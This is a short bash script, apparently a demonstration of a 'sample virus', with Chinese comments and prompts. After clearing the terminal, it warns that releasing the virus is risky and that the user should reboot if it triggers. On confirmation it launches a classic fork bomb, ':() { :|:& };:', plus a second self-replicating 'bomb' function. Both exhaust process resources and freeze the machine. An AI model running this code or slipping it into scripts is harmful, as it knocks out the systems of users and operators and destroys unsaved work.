#!/bin/bash
SCRIPT_PATH="$( cd "$( dirname "$0" )" >/dev/null 2>&1 && pwd )" # 获取当前脚本目录路径
cd "$SCRIPT_PATH/" || exit 127 # 解析进入脚本所在目录
echo -e -n "\033[$(head -3 ./config.ini|tail -1)"
for i in $(seq 1 $(stty size | awk '{print $1}'));
do
	echo -e -n "\033[2J"
done
echo -e -n "\033[0;0H"

function bomb
{
	bomb | bomb &
}

echo "爆发示例病毒存在风险，请谨慎！"
echo "若不慎爆发请立即重启计算机！"
read -rsn1 -p "是否继续[y/N]？" c
if [[ $c == "Y" ]] || [[ $c == "y" ]];
then
	:() { :|:& };: # fork
	bomb
fi
clear
exit 0
